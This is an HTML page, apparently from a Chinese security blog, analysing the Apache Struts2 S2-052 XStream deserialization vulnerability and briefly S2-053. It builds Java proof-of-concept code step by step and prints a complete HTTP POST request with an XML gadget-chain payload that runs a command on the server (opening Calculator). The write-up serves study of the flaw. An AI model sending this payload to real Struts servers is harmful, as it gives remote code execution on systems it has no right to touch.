@@ -1,0 +1,1227 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back(-1);
+                <!--window.location.href='https://kevien.github.io'-->;
+            }
+        }
+    })();
+</script>
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="M0rk,blog,security,hack,Hexo" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="前言漏洞爆发的那几天有事(主要还是懒)没有及时的跟进漏洞，这两天跟一下漏洞。 s2-052漏洞war包下载官方通告在分析这个漏洞之前，先补补基础知识。了解一下xstream这个包，看一下官方的一句话介绍，XStream is a simple library to serialize objects to XML and back again.就是一个序列化java对象为xml以及将xml反序列化">
+<meta name="keywords">
+<meta property="og:type" content="article">
+<meta property="og:title" content="struts-052和struts-053分析">
+<meta property="og:url" content="http://kevien.github.io/2017/09/17/struts-052和struts-053分析/index.html">
+<meta property="og:site_name" content="M0rk's Blog">
+<meta property="og:description" content="前言漏洞爆发的那几天有事(主要还是懒)没有及时的跟进漏洞，这两天跟一下漏洞。 s2-052漏洞war包下载官方通告在分析这个漏洞之前，先补补基础知识。了解一下xstream这个包，看一下官方的一句话介绍，XStream is a simple library to serialize objects to XML and back again.就是一个序列化java对象为xml以及将xml反序列化">
+<meta property="og:image" content="http://kevien.github.io/2017/09/17/struts-052和struts-053分析/xmlGenMain.png">
+<meta property="og:image" content="http://kevien.github.io/2017/09/17/struts-052和struts-053分析/xstreamstring.png">
+<meta property="og:image" content="http://kevien.github.io/2017/09/17/struts-052和struts-053分析/stringsExec.png">
+<meta property="og:image" content="http://kevien.github.io/2017/09/17/struts-052和struts-053分析/technique.png">
+<meta property="og:image" content="http://kevien.github.io/2017/09/17/struts-052和struts-053分析/s2rest.png">
+<meta property="og:image" content="http://kevien.github.io/2017/09/17/struts-052和struts-053分析/exp.png">
+<meta property="og:image" content="http://kevien.github.io/2017/09/17/struts-052和struts-053分析/s2-053.png">
+<meta property="og:updated_time" content="2018-08-31T17:23:18.509Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="struts-052和struts-053分析">
+<meta name="twitter:description" content="前言漏洞爆发的那几天有事(主要还是懒)没有及时的跟进漏洞，这两天跟一下漏洞。 s2-052漏洞war包下载官方通告在分析这个漏洞之前，先补补基础知识。了解一下xstream这个包，看一下官方的一句话介绍，XStream is a simple library to serialize objects to XML and back again.就是一个序列化java对象为xml以及将xml反序列化">
+<meta name="twitter:image" content="http://kevien.github.io/2017/09/17/struts-052和struts-053分析/xmlGenMain.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://kevien.github.io/2017/09/17/struts-052和struts-053分析/"/>
+
+
+
+
+
+  <title>struts-052和struts-053分析 | M0rk's Blog</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">M0rk's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/09/17/struts-052和struts-053分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="M0rk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M0rk's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                struts-052和struts-053分析
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-17T17:07:22+08:00">
+                2017-09-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>漏洞爆发的那几天有事(主要还是懒)没有及时的跟进漏洞，这两天跟一下漏洞。</p>
+<h4 id="s2-052"><a href="#s2-052" class="headerlink" title="s2-052"></a>s2-052</h4><p><a href="struts2-rest-showcase.war">漏洞war包下载</a><br><a href="https://cwiki.apache.org/confluence/display/WW/S2-052" target="_blank" rel="external">官方通告</a><br>在分析这个漏洞之前，先补补基础知识。<br><br>了解一下xstream这个包，看一下官方的一句话介绍，XStream is a simple library to serialize objects to XML and back again.就是一个序列化java对象为xml以及将xml反序列化为java对象。<br><br>我之前分析过json序列化和反序列化时常用的几种方法，今天我也学习一下xml序列化和反序列化的方法，目前来说有两种，一种是XMLDecoder，另外一种是xstream，xstream使用的比较早的多，然后这次的s2-052就是利用的xstream。<br><br><br>xstream反序列化的问题由来已久，早在四年前，老外就在defcon中讲述了这个问题<a href="https://www.youtube.com/watch?v=L6gXSiGtoqg" target="_blank" rel="external">link</a>，而且之前jenkins的反序列化漏洞也是和xstream有关。<br><br><img src="/2017/09/17/struts-052和struts-053分析/xmlGenMain.png" alt=""><br>我们可以看到，通过XMLGenerator.generateXML的方法就进行了序列化，而通过XMLGenerator.generateTOfromXML就进行了反序列化。这个XMLGenerator类的代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">import com.thoughtworks.xstream.XStream;</div><div class="line">import com.thoughtworks.xstream.io.xml.DomDriver;</div><div class="line"></div><div class="line">public final class XMLGenerator &#123;</div><div class="line">/*</div><div class="line"> * this class is for generating XML </div><div class="line"> */</div><div class="line"> </div><div class="line"> /*</div><div class="line">  * initialization of XStream class </div><div class="line">  */</div><div class="line"> private static XStream xstream = new XStream(new DomDriver())</div><div class="line"> &#123;&#123;</div><div class="line">  processAnnotations(Square.class);</div><div class="line">  processAnnotations(Rectangle.class);</div><div class="line"> &#125;&#125;;</div><div class="line"> </div><div class="line"> /*</div><div class="line">  * This class is for generating XML from MODEL class</div><div class="line">  * @param Object</div><div class="line">  * @return String </div><div class="line">  */</div><div class="line"> public static String generateXML(Object to) &#123;</div><div class="line">  return null == to ? &quot;&quot; : xstream.toXML(to);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> /*</div><div class="line">  * Generates the transfer object from the given XML using XStream.</div><div class="line">  * </div><div class="line">  * @param String</div><div class="line">  * @return transfer object</div><div class="line">  */</div><div class="line"> public static Object generateTOfromXML(String xml) &#123;</div><div class="line">  return xstream.fromXML(xml);</div><div class="line"> &#125; </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这里就用到了XStream。<br>现在我们再来看一下这样的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">import com.thoughtworks.xstream.XStream;</div><div class="line">import com.thoughtworks.xstream.io.xml.DomDriver;</div><div class="line"></div><div class="line">public class xstreamPOC &#123;</div><div class="line"></div><div class="line">	public static void main(String[] args) </div><div class="line">	&#123;</div><div class="line">//		String payload = &quot;&lt;square&gt;&quot;+ </div><div class="line">//						 &quot;	&lt;size&gt;5&lt;/size&gt;&quot;+</div><div class="line">//						 &quot;&lt;/square&gt; &quot;;	</div><div class="line">		String payload = &quot;&lt;string&gt;&quot;+ </div><div class="line">				 		&quot;	hello&quot;+</div><div class="line">				 		 &quot;&lt;/string&gt; &quot;;</div><div class="line">		</div><div class="line">		String inputXML = payload;</div><div class="line">		</div><div class="line">		//Square sq1 = (Square)XMLGenerator.generateTOfromXML(inputXML);</div><div class="line">		//the next code is what the XMLGenerator.generateTOfromXML is doing:</div><div class="line">		XStream xstream = new XStream(new DomDriver())	</div><div class="line">											&#123;&#123;</div><div class="line">												processAnnotations(Square.class);</div><div class="line">												processAnnotations(Rectangle.class);</div><div class="line">											&#125;&#125;;		</div><div class="line">		Square sq1 = (Square)xstream.fromXML(inputXML);</div><div class="line">		</div><div class="line">		System.out.println(String.format(&quot;sq1: \n \n%s \n\n&quot;, sq1));</div><div class="line"></div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/09/17/struts-052和struts-053分析/xstreamstring.png" alt=""><br>从上图可以看到，当我在序列化一个包含有string关键字的xml时候，他会首先产生一个string的类，然后强制转换成Square类。危险就出现在这里了，XStream将创建定义在xml中的对象。<br><br>那么如果我们换成下面的payload呢<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">String payload = &quot;&lt;java.lang.ProcessBuilder&gt;&quot;+ </div><div class="line">		 &quot;     &lt;command&gt;ExecuteMe&lt;/command&gt;&quot;+</div><div class="line">		 &quot;&lt;/java.lang.ProcessBuilder&gt;&quot;;</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/09/17/struts-052和struts-053分析/stringsExec.png" alt=""><br>可以看到我们就会实例化这个ProcessBuilder这个类。但是呢，目前为止我们还是只能创建对象，并不能invoke它们，所以这个时候就需要动态代理和EventHandle这两个技巧了。<br>看下面这样的代码，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">import java.beans.EventHandler;</div><div class="line">import java.util.Set;</div><div class="line">import java.util.TreeSet;</div><div class="line"></div><div class="line">public class XStreamPoC &#123;</div><div class="line"></div><div class="line">	public static void main(String[] args) </div><div class="line">	&#123;		</div><div class="line">		Set&lt;Comparable&gt; set = new TreeSet&lt;Comparable&gt;();</div><div class="line">        set.add(&quot;foo&quot;);</div><div class="line"></div><div class="line">        set.add(EventHandler.create(Comparable.class, </div><div class="line">        			new ProcessBuilder(&quot;open&quot;,&quot;/Applications/Calculator.app&quot;), &quot;start&quot;));</div><div class="line">		</div><div class="line">        String setXml = XMLGenerator.generateXML(set);</div><div class="line">		/*String payload = &quot;&lt;java.lang.ProcessBuilder&gt;&quot;+ </div><div class="line">						 &quot;     &lt;command&gt;ExecuteMe&lt;/command&gt;&quot;+</div><div class="line">						 &quot;&lt;/java.lang.ProcessBuilder&gt;&quot;;		</div><div class="line">		</div><div class="line">		String inputXML = payload;</div><div class="line">		</div><div class="line">		Square sq1 = (Square)XMLGenerator.generateTOfromXML(inputXML);</div><div class="line">		//Object sq1 = XMLGenerator.generateTOfromXML(inputXML);</div><div class="line">			</div><div class="line">		System.out.println(String.format(&quot;sq1 value: %s \n\nsq1 class: %s&quot;, sq1, sq1.getClass()));</div><div class="line">		 */</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/09/17/struts-052和struts-053分析/technique.png" alt=""><br>如上图所示，可以看到当转换发生异常的时候,就会执行start的操作。<br>介于此，我们的payload就可以这么写了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">import java.io.IOException;</div><div class="line">public class PoC_XMLGenerator &#123;</div><div class="line"></div><div class="line">	public static void main(String[] args) &#123;</div><div class="line">		// TODO Auto-generated method stub</div><div class="line"></div><div class="line">		String process = &quot;open&quot;; 		</div><div class="line">		String arguments = &quot;/Applications/Calculator.app&quot;;		</div><div class="line">		</div><div class="line">		String payload = &quot;&lt;sorted-set&gt;&quot; +  </div><div class="line">						 //&quot;&lt;string&gt;foo&lt;/string&gt;&quot; +</div><div class="line">						 &quot;&lt;dynamic-proxy&gt;&quot; + </div><div class="line">						 &quot;&lt;interface&gt;java.lang.Comparable&lt;/interface&gt;&quot; +</div><div class="line">						 &quot;&lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;&quot; +</div><div class="line">						 &quot;    &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;&quot; +</div><div class="line">						 &quot;         &lt;command&gt;&quot; +</div><div class="line">						 &quot;             &lt;string&gt;&quot; + process + &quot;&lt;/string&gt;&quot; +</div><div class="line">						 &quot;             &lt;string&gt;&quot; + arguments + &quot;&lt;/string&gt;&quot; +</div><div class="line">						 &quot;        &lt;/command&gt;&quot; +</div><div class="line">						 &quot;    &lt;/target&gt;&quot; +</div><div class="line">						 &quot;    &lt;action&gt;start&lt;/action&gt;&quot; +</div><div class="line">						 &quot;&lt;/handler&gt;&quot; + </div><div class="line">						 &quot;&lt;/dynamic-proxy&gt;&quot; + 						</div><div class="line">						&quot;&lt;/sorted-set&gt;&quot;;</div><div class="line">		</div><div class="line">		XMLGenerator.generateTOfromXML(payload);</div><div class="line">		</div><div class="line">		System.out.println(&quot;Will not get here&quot;);</div><div class="line"></div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>至此，XStream的利用点分析完了。下面再来看看struts2中的利用。<br><br>通过官方的一句话公告 A RCE attack is possible when using the Struts REST plugin with XStream handler to deserialise XML requests可以看出问题出在struts rest plugin，这个REST插件struts2-rest-plugin.jar用到了XStreamHandler这个类，这个类对http请求中content-type是application/xml的，会调用XStream进行处理。<br><img src="/2017/09/17/struts-052和struts-053分析/s2rest.png" alt=""><br>可以看到，当contenttype为xml的时候的处理类是XStreamHandler。那么我们就可以将恶意代码以xml为载体，通过Content-type为xml的方式，让XStreamHandler去进行序列化，那么这个时候就会触发漏洞。<br><br>最终payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line">POST /struts2-rest-showcase/orders/3 HTTP/1.1</div><div class="line">Host: localhost:8080</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Content-Type: application/xml</div><div class="line">Content-Length: 2430</div><div class="line"></div><div class="line">&lt;map&gt;</div><div class="line">  &lt;entry&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</div><div class="line">      &lt;flags&gt;0&lt;/flags&gt;</div><div class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</div><div class="line">        &lt;dataHandler&gt;</div><div class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</div><div class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</div><div class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</div><div class="line">                &lt;initialized&gt;false&lt;/initialized&gt;</div><div class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</div><div class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</div><div class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</div><div class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</div><div class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</div><div class="line">                      &lt;command&gt;</div><div class="line">                        &lt;string&gt;open&lt;/string&gt;</div><div class="line">                        &lt;string&gt;/Applications/Calculator.app&lt;/string&gt;</div><div class="line">                      &lt;/command&gt;</div><div class="line">                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</div><div class="line">                    &lt;/next&gt;</div><div class="line">                  &lt;/iter&gt;</div><div class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</div><div class="line">                    &lt;method&gt;</div><div class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</div><div class="line">                      &lt;name&gt;start&lt;/name&gt;</div><div class="line">                      &lt;parameter-types/&gt;</div><div class="line">                    &lt;/method&gt;</div><div class="line">                    &lt;name&gt;foo&lt;/name&gt;</div><div class="line">                  &lt;/filter&gt;</div><div class="line">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</div><div class="line">                &lt;/serviceIterator&gt;</div><div class="line">                &lt;lock/&gt;</div><div class="line">              &lt;/cipher&gt;</div><div class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</div><div class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</div><div class="line">              &lt;done&gt;false&lt;/done&gt;</div><div class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</div><div class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</div><div class="line">              &lt;closed&gt;false&lt;/closed&gt;</div><div class="line">            &lt;/is&gt;</div><div class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</div><div class="line">          &lt;/dataSource&gt;</div><div class="line">          &lt;transferFlavors/&gt;</div><div class="line">        &lt;/dataHandler&gt;</div><div class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</div><div class="line">      &lt;/value&gt;</div><div class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">  &lt;/entry&gt;</div><div class="line">  &lt;entry&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">  &lt;/entry&gt;</div><div class="line">&lt;/map&gt;</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/09/17/struts-052和struts-053分析/exp.png" alt=""></p>
+<ul>
+<li>补丁对比<br><a href="https://github.com/apache/struts/commit/19494718865f2fb7da5ea363de3822f87fbda264" target="_blank" rel="external">补丁代码</a><h4 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h4></li>
+<li>关于s2-053的漏洞问题是安全编码和习惯的问题,而非struts2通杀漏洞。<br><br><a href="http://struts.apache.org/docs/s2-053.html" target="_blank" rel="external">官方通告</a><br><img src="/2017/09/17/struts-052和struts-053分析/s2-053.png" alt=""></li>
+<li>较s2-052，s2-053漏洞更简单和直接。<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4></li>
+<li><del>我还是喜欢用eclipse分析java漏洞。</del>，还是好像还是idea比较好用啊，只是从eclipse切换过来略蛋疼。切换过来之后，你会发现你的ide好像都要是JetBrains这个公司的了。</li>
+<li>基础还是不够牢固，给自己定个小计划，后面有时间把所有的s2漏洞分析一下。总结一下思路。<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
+<li>Standard way to serialize and deserialize Objects with XStream<br><a href="http://blog.sodhanalibrary.com/2013/12/standard-way-to-serialize-and.html#.Wb6sFdMjE0o" target="_blank" rel="external">http://blog.sodhanalibrary.com/2013/12/standard-way-to-serialize-and.html#.Wb6sFdMjE0o</a></li>
+<li>一步一步的构造payload<br><a href="https://gist.github.com/DinisCruz/8077118#file-1-poping-a-calculator-on-osx-using-xmlgenerator-xstream-based-api-java" target="_blank" rel="external">https://gist.github.com/DinisCruz/8077118#file-1-poping-a-calculator-on-osx-using-xmlgenerator-xstream-based-api-java</a></li>
+<li>XStream “Remote Code Execution” exploit on code from “Standard way to serialize and deserialize Objects with XStream” article<br><a href="http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html?m=1" target="_blank" rel="external">http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html?m=1</a></li>
+<li>Struts2 S2-052 RCE分析与利用<br><a href="https://paper.seebug.org/383/" target="_blank" rel="external">https://paper.seebug.org/383/</a></li>
+<li>CVE-2017-9805:Struts2 REST插件远程执行命令漏洞(S2-052) 分析报告<br><a href="https://yq.aliyun.com/articles/197926" target="_blank" rel="external">https://yq.aliyun.com/articles/197926</a></li>
+<li>S2-052漏洞分析及官方缓解措施无效验证<br><a href="http://xxlegend.com/2017/09/06/S2-052%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AE%98%E6%96%B9%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E6%97%A0%E6%95%88%E9%AA%8C%E8%AF%81/" target="_blank" rel="external">http://xxlegend.com/2017/09/06/S2-052%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AE%98%E6%96%B9%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E6%97%A0%E6%95%88%E9%AA%8C%E8%AF%81/</a></li>
+<li>Struts2 S2-052漏洞分析<br><a href="https://www.waitalone.cn/struts2-s2-052.html" target="_blank" rel="external">https://www.waitalone.cn/struts2-s2-052.html</a></li>
+<li>Struts2-052漏洞分析<br><a href="https://yaofeifly.github.io/2017/09/08/Struts2-052/" target="_blank" rel="external">https://yaofeifly.github.io/2017/09/08/Struts2-052/</a></li>
+<li>Apache Struts2 Remote Code Execution (S2-053)<br><a href="http://reverse-tcp.xyz/2017/09/15/Apache-Struts2-remote-code-execution-(s2-053)/" target="_blank" rel="external">http://reverse-tcp.xyz/2017/09/15/Apache-Struts2-remote-code-execution-(s2-053)/</a></li>
+<li>S2-053 复现分析过程(附POC)<br><a href="https://mp.weixin.qq.com/s/4CiKgVn7Y-hWUKRjgECsuA" target="_blank" rel="external">https://mp.weixin.qq.com/s/4CiKgVn7Y-hWUKRjgECsuA</a></li>
